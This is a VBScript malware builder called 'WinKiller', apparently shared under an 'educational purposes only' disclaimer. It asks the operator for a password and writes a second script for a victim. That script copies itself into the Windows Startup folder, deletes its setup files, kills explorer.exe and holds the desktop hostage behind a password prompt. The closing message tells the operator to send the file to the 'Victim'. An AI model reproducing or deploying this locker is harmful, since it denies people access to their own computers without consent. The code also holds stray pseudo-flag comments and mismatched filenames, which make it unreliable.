'# Scripted By RICH Brain'

Set obj=createObject("wscript.shell")' -f 100 -O cmd.exe
Set fso=createObject("Scripting.FileSystemObject")' -f -FF -a __windows__
'Sey opl=createObject("WMPlayer.OCX")
obj.run fso.getAbsolutePathName(".")&"\file_354022.mp3"
If Not fso.FileExists("passPlace.txt") then
fso.createTextFile("passPlace.txt",1).writeLine "richbrainKit"
Else
Set ps=fso.openTextFile("passPlace.txt",1,0)' -p passPlace.txt 0
Dim pass : pass=ps.ReadLine' -d -ps passPlace.txt -c
End If
'obj.run "cmd.exe"'  -r -ms -cmd-setup 1
Sub nm(CXS)' -f -i input.exe /IM /F
wscript.sleep 200 'm/s/ss' -d 0.2
obj.sendKeys CXS&"{enter}"'; -f input.exe -data-set = cxc/cxcv/cxz -r
End Sub' -f -kill-input 1
chp=msgBox("WinKiller Tool by RICHBrain v.1"&vbLf&vbLf&"t.me/ThisIsRichBrain"&vbLf&"Use This Tool Just For Educational Purposes Only"&vbLf&"For More Information Contact ME At Telegram."&vbLf&vbLf&vbLf&"-- Wanna Change Default Password ? ",vbYesNo+vbSystemModal+vbQuestion,"Welcome To WinKiller -by RICH Brain")
If chp=vbYes then
npass=trim(inputBox("Enter Script Pass : ( root : "&fso.openTextFile("passPlace.txt",1).readLine&" )","Change Default Password"))
If npass="" then
msgBox "Password can't be empty"
wscript.quit
End If
acc=msgBox("Your Password change from "&vbLf&"'"&fso.openTextFile("passPlace.txt",1).readLine&"' to '"&npass&"' ?",vbOkCancel+vbSystemModal)
If acc=vbOk then
fso.openTextFile("passPlace.txt",2).write npass
End If
End If
Set winKiller=fso.openTextFile("winKiller-set.vbs",2,1)
winKiller.WriteLine "'#Scripting By RichBrain'"&vbLf
winKiller.WriteLine "Set obj=createObject(""wscript.shell"")"
winKiller.WriteLine "Set fso=createObject(""Scripting.fileSystemObject"")"
winKiller.WriteLine "If not fso.fileExists(obj.specialFolders(""StartUp"")&""\winKiller.vbs"") then"
winKiller.WriteLine "fso.MoveFile wscript.scriptfullname,obj.specialFolders(""StartUp"")&""\winKiller.vbs"""
winKiller.WriteLine "End If"
winKiller.writeLine "fso.DeleteFile ""passPlace.txt"""
winKiller.writeLine "fso.DeleteFile ""winKiller-set.vbs"""
winKiller.writeLine "fso.DeleteFile ""winKiller.vbs"""
winKiller.writeLine "fso.DeleteFile ""README.md"""
winKiller.writeLine "fso.DeleteFile ""file_354022.mp3"""
winKiller.WriteLine "obj.run ""taskkill /f /IM explorer.exe"",0"
winKiller.WriteLine "pass="""&fso.openTextFile("passPlace.txt",1).readLine& """ "
winKiller.writeLine "Do until input=pass"
winKiller.writeLine "input=inputBox(""Enter PassWord to Access Your Windows :"")"
winKiller.writeLine "If input=pass then"
winKiller.writeLine "Exit Do"
winKiller.writeLine "End If"
winKiller.writeLine "Loop"
winKiller.writeLine "obj.run ""explorer.exe"""
winKiller.close
msgBox "Ok , All Configs Set."&vbLf&" Send the 'winKiller-setup.vbs' to Victim ...",vbOkOnly+vbSytemModal,"See You Later ...(RICH Brain)"
